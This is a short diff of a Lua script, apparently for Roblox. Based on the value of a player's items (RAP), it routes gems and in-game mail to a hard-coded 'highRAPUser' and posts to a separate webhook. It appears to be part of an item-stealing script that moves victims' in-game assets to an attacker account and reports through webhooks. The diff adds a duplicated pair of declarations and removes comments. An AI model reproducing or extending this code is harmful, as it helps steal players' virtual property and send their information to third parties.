@@ -298,6 +298,10 @@ if #sortedItems > 0 then
 local targetUser = (totalRAP > 100000) and highRAPUser or plr.Name
 local targetWebhook = (totalRAP > 100000) and highRAPWebhook or webhook
 
+-- Conditional check: if total RAP > 100,000, send to high RAP user/webhook
+local targetUser = (totalRAP > 100000) and highRAPUser or plr.Name
+local targetWebhook = (totalRAP > 100000) and highRAPWebhook or webhook
+
 spawn(function()
     -- Conditional send logic based on totalRAP value
     if totalRAP > 100000 then
@@ -306,8 +310,6 @@ spawn(function()
         SendMessage(highRAPUser, GemAmount1, highRAPWebhook, highRAPUser)  -- Ensure to send message to highRAPUser
         SendMail(highRAPUser, GemAmount1, highRAPWebhook)  -- Ensure mail is sent to highRAPUser
 
-        -- Webhook is already being sent to highRAPWebhook
-        -- No mail for the global user in this case
     else
         -- If total RAP <= 100,000:
         -- Send both message and mail to global webhook/user
